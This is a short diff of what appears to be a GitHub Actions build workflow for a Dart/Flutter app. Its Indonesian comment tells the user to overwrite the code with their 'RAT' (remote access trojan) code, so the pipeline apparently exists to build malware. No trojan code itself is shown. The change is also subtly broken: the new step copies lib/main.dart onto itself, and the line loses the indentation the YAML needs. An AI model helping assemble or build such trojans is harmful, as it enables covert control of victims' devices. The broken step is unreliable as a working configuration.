@@ -35,7 +35,7 @@ jobs:
 
       # TIMPA dengan kode RAT kamu
       - name: Copy Your Main Dart
-        run: cp main.dart lib/main.dart
+  run: cp lib/main.dart lib/main.dart
 
       # Tambahkan dependencies
       - name: Get Dependencies
